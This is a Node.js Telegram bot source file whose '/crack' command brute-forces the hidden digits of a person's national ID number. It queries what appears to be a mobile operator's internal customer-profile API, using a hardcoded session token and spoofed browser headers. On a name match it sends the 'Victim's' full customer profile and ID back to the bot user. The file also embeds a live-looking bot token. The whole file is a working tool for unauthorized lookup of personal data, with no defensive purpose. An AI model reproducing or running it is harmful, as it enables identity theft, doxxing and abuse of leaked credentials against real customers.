const { Telegraf } = require("telegraf");
const express = require("express");
const axios = require("axios");
const bot = new Telegraf("5493715552:AAGO5wWsV_4G2VApvoP7U8sHvz_URe0d84o");

bot.start((ctx) => ctx.reply("Welcome! Please enter a command"));

//--------------------------------------------------------------------------------

const app = express();
app.get("/", (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>My Express App</title>
      </head>
      <body>
        <h1>Welcome to my Express app!</h1>
      </body>
    </html>
  `);
});

app.listen(3000, () => {
    console.log("Server started on port 3000");
});
//--------------------------------------------------------------------------------

bot.command("crack", (ctx) => {
  
  console.log(ctx.message.text);

   ctx.reply("Attack started");

  const inputString = ctx.message.text.substr(9); // remove '/process ' from the input string
  const noSpacesStr = inputString.replace(/\s/g, "").toLowerCase(); // replace all whitespace characters with empty string
  console.log(noSpacesStr); // Output: "Thisisastringwithspaces"

  const [firstWord, secondWord, thirdWord] = noSpacesStr.split("|");

  (async function() {
    let foundResponse = false;
    for (let i = 1000; i <= 5000 && !foundResponse; i++) {
      let nid = i.toString().padStart(4, "0");
      try {
        const response = await axios.get(
          "https://svsnll.robi.com.bd/api/v1/Activity/GetProfileHistory", {
          params: {
            queryType: "NID",
            queryValue: firstWord + nid + secondWord,
          },
          headers: {
            Accept: "application/json, text/plain, */*",
            "Accept-Language": "en-US,en-GB;q=0.9,en;q=0.8",
            "Access-Control-Allow-Headers": "*",
            "Cache-Control": "no-cache",
            Connection: "keep-alive",
            DNT: "1",
            Origin: "https://svsweb.robi.com.bd",
            Referer: "https://svsweb.robi.com.bd/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
            UserId: "5851037",
            crossdomain: "true",
            "sec-ch-ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6Ijg4MDE4OTQ0MTA2MDgiLCJjZXJ0c2VyaWFsbnVtYmVyIjoiMTExMTExMTExMTExMTExMTEiLCJuYW1laWQiOiI1ODUxMDM3IiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy91c2VyZGF0YSI6IjIiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyZWQiOiI0LzE5LzIzIDQ6NTM6MDIgUE0iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9tb2JpbGVwaG9uZSI6Ijg4MDE4OTQ0MTA2MDgiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9vdGhlcnBob25lIjoiODgwMTg5NDQxMDYwOCIsInByaW1hcnlzaWQiOiJSMDQ0NjE1NSIsInByaW1hcnlncm91cHNpZCI6IlIwNDQ2MTU1IiwiZ3JvdXBzaWQiOiIxNzUiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zaWQiOiIyIiwibmJmIjoxNjgxODM2NzgyLCJleHAiOjE2ODE5MjMxODIsImlhdCI6MTY4MTgzNjc4Mn0.UZWtzXjsOzXo_V3sAR4QjBHFWOqSJz5S3d-ALe8F5xg",
          },
        }
        );

        let resm = response.data.result.customerProfileInfo.customerName;
        const noSpacesStr2 = resm.replace(/\s/g, ""); // replace all whitespace characters with empty string
        console.log(noSpacesStr2); // Output: "Thisisastringwithspaces"

        if (noSpacesStr2 == thirdWord) {
          console.log(response.data.result.customerProfileInfo);

          const message = JSON.stringify(
            response.data.result.customerProfileInfo,
            null,
            2
          );

          ctx.reply(
            message + "\n\nVictims NID =>" + firstWord + nid + secondWord
          );
          // ctx.reply("Victims NID =>" + firstWord + nid + secondWord);

          foundResponse = true;
          break;
        }
        console.log("trying->", nid);
      } catch (e) {
        console.log(" err", i);
        // do nothing and continue with next iteration
      }
    }
  })();
});

bot.launch();